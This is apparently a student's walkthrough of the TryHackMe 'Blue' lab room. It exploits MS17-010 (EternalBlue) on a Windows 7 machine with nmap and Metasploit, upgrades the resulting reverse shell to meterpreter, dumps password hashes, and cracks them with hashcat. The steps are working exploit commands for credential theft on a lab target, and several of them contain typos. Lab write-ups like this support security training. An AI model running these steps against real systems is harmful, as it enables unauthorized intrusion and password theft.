1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
2) WE HAVE TO JOIN THE ROOM "BLUE".
 
TASK - 1 (RECON)

1. SCAN THE MACHNE.

    namp -Pn <ip>

    nmap -A -T 5 <ip> -vv

"it's a windows 7 machine".

2. How many ports are open with a port number under 1000?
ANS: 3 ports are open under 1000.

3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08–067)
ANS: for this we have to write a command - nmap --script vuln <ip> -vv 
       it shows - ms17-010 .

----------TASK 1 COMPLETED----------

TASK - 2 (GAIN ACCESS)

1. START METASPLOIT 
 
    msfconsole

2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/……..)?

    search ms17-010

"Because the machine is windows 7. Let’s try “windows/smb/ms17_010_eternalblue”  ".

    use 0 

3. Show options and set the one required value. What is the name of this value? (All caps for submission).

    show options

    set RHOSTS <target ip>

"before exploit please check LHOST and LPORT . your LHOSTS will be your tun0 and you LPORT will be 4444"

    exploit / run 

SUCCESS !! , if not then try you defalut LHOST and LPORT.

5. . Confirm that the exploit has run correctly. You may have to press enter 
     for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, 
     you may have to reboot the target VM. Try running it again before a reboot 
     of the target.

----------TASK 2 COMPLETED-----------
 
TASK - 3 (ESCALATE)

1 . If you haven’t already, background the previously gained shell (CTRL + Z).
     Research online how to convert a shell to meterpreter shell in metasploit. 
     What is the name of the post module we will use? (Exact path, similar to the 
     exploit we previously selected).

In ESCALATE we don't have to do much but let's go.

Conversion of shell to METERPRETER.

WE ALLREADY GAIN ACCESS TO SYSTEM BLUE BUT WE GAINED SHELL NOT METERPRETER.

METERPRETER IS DREAM OF EVERY HACKER.

LETS DO IT 

THERE ARE TWO WAYS ----- ////

1. IN SHELL TYPE CTRL+C OR TYPE EXIT THEN IT WILL ASK FOR SESSION SAVE PRESS THERE Y AND THEN THERE A CHANGE THAT YOU WILL GET METERPRETER IF NOT THEN TYPE SESSION -U THEN PRESS SESSION 2 THEN YOU WILL GET METERPRETER.

2.THIS METHOD IS USED IN THM IN THIS WE USE MODULE WHICH IS---

USE post/multi/manage/shell_to_meterpreter

FROM THIS YOU WILL GET METERPRETER SHELL.

-------------------------TASK-3 COMPLETED ----------------------------------

TASK-4 ( CRACKING )

NOW PRESS PS IT WILL SHOW ALL PROCESS THEN WE HAVE TO GO TO A NT AUTHORITY SERVICE WITH MIGRATE AND ID OF YOUR DESIRED SERVICE.

TYPE DUMP HASH IT WILL SHOW ALL THE HASHED USERS AND ITS PASSWORDS..

IT'S TIME TO CRACK IT'S HASHES---

WE WILLL USE HASHCAT FOR IT ( REMEMBER IT'S HASHES PASSWORD WILL BE IN ROCKYOU.TXT IN /USE/SHARE/WORDLISTS/ )

hashcat --username --show -m 1000 -a 0 (your hashes you get from blue ) (path to rockyou.txt) 

WE WILL GET ALL THE UERS AND PASSWORDS AND USERS.

------------------------- TASK-4 COMPLETED ---------------------------------
